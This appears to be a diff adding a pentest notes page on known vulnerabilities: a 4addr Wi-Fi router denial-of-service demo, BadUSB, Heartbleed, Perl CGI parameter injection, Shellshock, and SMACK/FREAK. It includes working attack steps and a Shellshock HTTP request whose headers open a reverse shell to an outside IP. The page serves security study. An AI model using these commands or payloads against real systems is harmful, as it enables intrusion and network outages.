@@ -1,0 +1,229 @@
+.. include:: /pentest_links.txt
+
+
+**************
+Vulnerabilites
+**************
+
+.. _4addrDOS:
+
+``4addr`` router DOS
+====================
+
+the exploit & ``4addr``
+-----------------------
+
+There is a vulnerability in some (home) routers that can take down the router's wired and wireless networks just by attempting to connect to the wireless network with a wireless interface having the ``4addr`` option set. It is significant that any attacker can scan for wireless networks and attack the router just by trying to connect.
+
+From `Using 4-address for AP and client mode <http://wireless.kernel.org/en/users/Documentation/iw#Using_4-address_for_AP_and_client_mode>`_:
+
+  In some situations it might be useful to run a network with an Access Point and multiple clients, but with each client bridged to a network behind it. For this to work, both the client and the AP need to transmit 4-address frames, containing both source and destination MAC addresses. ... 4-address mode is not compatible with other WDS implementations, ie, you'll need all endpoints using this mode in order for WDS to work appropriately.
+
+So instead of the normal 3 MAC addresses, 4 are transmitted. From `Wireless distribution system <http://en.wikipedia.org/wiki/Wireless_distribution_system>`_:
+
+  WDS may be incompatible between different products (even occasionally from the same vendor) since the IEEE 802.11-1999 standard does not define how to construct any such implementations or how stations interact to arrange for exchanging frames of this format. The IEEE 802.11-1999 standard merely defines the 4-address frame format that makes it possible.
+
+Just what we need for an exploit.
+
+exploit details
+---------------
+
+For this demo we used 3 devices: the target ROUTER providing a wired network and wireless network (SSID "WIFI" here); a Kali Linux HACKER laptop; and a wired local DESKTOP to demo the router failure.
+
+On HACKER, we insure network-manager is stopped and set the wlan0 interface ``4addr`` on:
+
+.. code-block:: console
+
+  hacker@kali:~$ WLAN=wlan0
+  hacker@kali:~$ sudo service network-manager stop
+  hacker@kali:~$ sudo iw dev $WLAN set 4addr on
+
+On DESKTOP we start a ``ping`` to show the ROUTER's wired connectivity working:
+
+.. code-block:: console
+
+  user@desktop:~$ ping 192.168.1.1
+  PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
+  64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.455 ms
+  64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.335 ms
+  64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.321 ms
+  ###################### SNIP ######################
+
+Now that the ``ping`` is running, begin the attack from HACKER by starting up network-manager and try to connect to SSID "WIFI". You don't even need to know the password - you just have to try to connect over a ``4addr`` wireless interface:
+
+.. code-block:: console
+
+  hacker@kali:~$ sudo service network-manager start
+  hacker@kali:~$ # use the network-manager GUI to connect to SSID "WIFI"
+  hacker@kali:~$ #   enter the wrong password to mimick attacking an unknown network
+
+On DESKTOP the ``ping`` will eventually show the network failure:
+
+.. code-block:: console
+
+  64 bytes from 192.168.1.1: icmp_seq=52 ttl=64 time=0.339 ms
+  64 bytes from 192.168.1.1: icmp_seq=53 ttl=64 time=0.334 ms
+  64 bytes from 192.168.1.1: icmp_seq=54 ttl=64 time=0.406 ms
+  64 bytes from 192.168.1.1: icmp_seq=55 ttl=64 time=0.374 ms
+  64 bytes from 192.168.1.1: icmp_seq=56 ttl=64 time=0.367 ms
+  From 192.168.1.28 icmp_seq=100 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=101 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=102 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=103 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=104 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=105 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=106 Destination Host Unreachable
+  ###################### SNIP ######################
+
+Both ROUTER's wired and wireless networks are now busted, requiring power cycling the ROUTER to fix. If we left the HACKER machine configuration the same, every recycle would lead to a busted network. To allow ROUTER's network to recover, turn off network-manager and set ``4addr`` off:
+
+.. code-block:: console
+
+  hacker@kali:~$ WLAN=wlan0
+  hacker@kali:~$ sudo service network-manager stop
+  hacker@kali:~$ sudo iw dev $WLAN set 4addr off
+
+Now power cycle the ROUTER and watch the ping start working:
+
+.. code-block:: console
+
+  From 192.168.1.28 icmp_seq=170 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=171 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=172 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=173 Destination Host Unreachable
+  From 192.168.1.28 icmp_seq=174 Destination Host Unreachable
+  64 bytes from 192.168.1.1: icmp_seq=175 ttl=64 time=0.456 ms
+  64 bytes from 192.168.1.1: icmp_seq=176 ttl=64 time=0.503 ms
+  64 bytes from 192.168.1.1: icmp_seq=177 ttl=64 time=0.419 ms
+  64 bytes from 192.168.1.1: icmp_seq=178 ttl=64 time=0.341 ms
+
+
+BadUSB
+======
+
+From `Firmware - Security risks <http://en.wikipedia.org/wiki/Firmware#Security_risks>`_:
+
+  Mark Shuttleworth, founder of the Ubuntu Linux distribution, has described proprietary firmware as a security risk, saying that "firmware on your device is the NSA's best friend" and calling firmware "a trojan horse of monumental proportions". He has pointed out that low-quality, closed source firmware is a major threat to system security: "Your biggest mistake is to assume that the NSA is the only institution abusing this position of trust – in fact, it's reasonable to assume that all firmware is a cesspool of insecurity, courtesy of incompetence of the highest degree from manufacturers, and competence of the highest degree from a very wide range of such agencies".
+
+  A USB device firmware hack called BadUSB was presented at Black Hat USA 2014 conference, demonstrating how a USB flash drive microcontroller can be reprogrammed to spoof various other device types in order to take control of a computer, exfiltrate data, or spy on the user. Other security researchers have worked further on how to exploit the principles behind the BadUSB, releasing at the same time the source code of hacking tools that can be used modify the behavior of USB flash drives.
+
+From `Turning USB peripherals into BadUSB <https://srlabs.de/badusb/>`_, that little USB device you're plugging into your computer has a controller chip that can be reprogrammed to turn it into an evil BadUSB, like a keyboard, network card, or even boot a small virus. Currently there are no known effective defenses.
+
+`Phison 2251-03 (2303) Custom Firmware & Existing Firmware Patches <https://github.com/adamcaudill/Psychson>`_ github repository provides source code for a firmware attack against `Phison <http://en.wikipedia.org/wiki/Phison>`_ USB controllers.
+
+View the overview presentation `BadUSB - On accessories that turn evil <https://srlabs.de/blog/wp-content/uploads/2014/07/SRLabs-BadUSB-BlackHat-v1.pdf>`_.
+
+
+Heartbleed
+==========
+
+`Heartbleed <http://heartbleed.com/>`_ (see `CVE-2014-0160 <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160>`_ and `Wikipedia Heartbleed <http://en.wikipedia.org/wiki/Heartbleed>`_) is best explained via the simple cartoon `How the Heartbleed Bug Works <http://xkcd.com/1354/>`_. Basically, you can request up to 64k memory dumped which can contain important data like certificates, user credentials, or sensitive data.
+
+
+Perl Web Vulnerability
+======================
+
+`New Class of Vulnerability in Perl Web Applications <http://blog.gerv.net/2014/10/new-class-of-vulnerability-in-perl-web-applications/>`_ describes exploitation of Perl's dynamic nature: ``$cgi->param()`` call is context sensitive and can return a scalar or an array depeding on the context you call it. If you call it in an array context then it returns an array of values, but in a scalar context it returns a single value (maybe the first one if multiple values are present).
+
+Consider this Perl code (from the above link):
+
+.. code-block:: perl
+
+  my $otheruser = Bugzilla::User->create({
+      login_name => $login_name, 
+      realname   => $cgi->param('realname'), 
+      cryptpassword => $password});
+
+So then you provide multiple realname's:
+
+.. code-block:: text
+
+  index.cgi?realname=JRandomUser&realname=login_name&realname=admin@mozilla.com
+
+Then the realname becomes *admin@mozilla.com* and you you base admin permissions off having a realname ending in "@mozilla.com" they've just created an admin user.
+
+The fix is to clearly state a value is a scalar:
+
+.. code-block:: perl
+
+  my $otheruser = Bugzilla::User->create({
+      login_name => $login_name, 
+      realname   => scalar $cgi->param('realname'), 
+      cryptpassword => $password});
+
+
+Shellshock
+==========
+
+`Shellshock <http://en.wikipedia.org/wiki/Shellshock_(software_bug)>`_ is "a family of security bugs" in ``bash``. Also see `Shellshock FAQ <http://www.zdnet.com/the-shellshock-faq-heres-what-you-need-to-know-7000034219/>`_ and `What is #shellshock? <https://shellshocker.net/>`_.
+
+``bash`` Example
+----------------
+
+"The first bug causes Bash to unintentionally execute commands when the commands are concatenated to the end of function definitions stored in the values of environment variables."
+
+.. code-block:: bash
+
+  # "() { :;};" is a function definition, "echo vulnerable" is a trailing command
+  env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+However, more bugs were discovered, including this one where a file *echo* containing the result of the ``date`` command is created in the working directory.
+
+.. code-block:: console
+
+  $ X='() { (a)=>\' bash -c "echo date"
+  bash: X: line 1: syntax error near unexpected token `='
+  bash: X: line 1: `'
+  bash: error importing function definition for `X'
+  $ cat echo
+  Fri Sep 26 01:37:16 UTC 2014
+
+CGI Example
+-----------
+
+`Yahoo! Shellshocked Like Ninja Turtles! <http://www.futuresouth.us/wordpress/?p=5>`_ shows how Yahoo might have been hacked. It shows CGI can use ``bash`` and can be found with a Google searchs like 'inurl:cgi-bin filetype:sh', 'inurl:cgi-bin filetype:pl', and 'inurl:cgi-bin filetype:cgi'. A http request of
+
+.. code-block:: text
+
+  GET %s HTTP/1.0\r\n
+  User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/199.175.52.92/2221 0>&1\r\n
+  Cookie: () { :; }; /bin/bash -i >& /dev/tcp/199.175.52.92/2221 0>&1\r\n
+  Host: %s\r\n
+  Referer: () { :; }; /bin/bash -i >& /dev/tcp/199.175.52.92/2221 0>&1\r\n
+  \r\n
+
+They User-Agent, Cookie, and Referer fields execute the command ``/bin/bash -i >& /dev/tcp/199.175.52.92/2221 0>&1\r\n``, which opens an interactive shell, redirects stdout, stderr, and stdin over tcp to host 199.175.52.92 on port 2221. Sitting on port 2221 on the remote host can be a program that issues shell commands.
+
+More Exploitation Vectors
+-------------------------
+
+There are more `specific exploitation vectors <http://en.wikipedia.org/wiki/Shellshock_(software_bug)#Specific_exploitation_vectors>`_.
+
+
+SMACK & FREAK
+=============
+
+`SMACK: State Machine AttaCKs <https://www.smacktls.com/>`_ assumes:
+
+  a network adversary (i.e. a man-in-the-middle) to tamper with TLS handshake messages. The typical scenario to mount such attacks is by tampering with the Domain Name System (DNS), for example via DNS rebinding or domain name seizure.
+
+  We find that several TLS implementations incorrectly allow some messages to be skipped even though they are required for the selected cipher suite. The explanation for these attacks is very simple: libraries attempt to reuse as much code as possible between the different cipher suites. However, the consequences of these vulnerabilities can be severe.
+
+In fact:
+
+  *JSSE clients allow the peer to skip all messages related to key exchange and authentication*. In particular, a network attacker can send the certificate of any arbitrary website, and skip the rest of the protocol messages. A vulnerable JSSE client is then willing to accept the certificate and start exchanging unencrypted application data. In other words, the JSSE implementation of TLS has been providing virtually no security guarantee (no authentication, no integrity, no confidentiality) for the past several years.
+
+  Our attacks show that a malicious server can simply skip TLS altogether: it can pretend to be any server and exchange plaintext data with the client. Still Java clients are used routinely to access sensitive HTTPS APIs such as Google, Paypal, and Amazon Web Services through popular Java SDKs.
+
+FREAK exploits a SMACK-type state machine vulnerability wherby a man-in-the-middle can downgrade the ciphersuite selected to an old, weak RSA export cipher:
+
+  Thus, if a server is willing to negotiate an export ciphersuite, a man-in-the-middle may trick a browser (which normally doesn't allow it) to use a weak export key. By design, export RSA moduli must be less than 512 bits long; hence, they can be factored in less than 12 hours for $100 on Amazon EC2.
+
+  Ironically, many US government agencies (including the NSA and FBI), as well as a number of popular websites (IBM, or Symantec) enable export ciphersuites on their server - by factoring their 512-bit RSA modulus, an attacker can impersonate them to vulnerable clients.
+
+For an excellent overview of the exploit see `Attack of the week: FREAK (or 'factoring the NSA for fun and profit') <http://blog.cryptographyengineering.com/2015/03/attack-of-week-freak-or-factoring-nsa.html>`_. Especially interesting is that:
+
+  Apache mod_ssl by default will generate a single export-grade RSA key when the server starts up, and will simply re-use that key for the lifetime of that server.
+
+  What this means is that you can obtain that RSA key once, factor it, and break every session you can get your 'man in the middle' mitts on until the server goes down. And that's the ballgame.
+
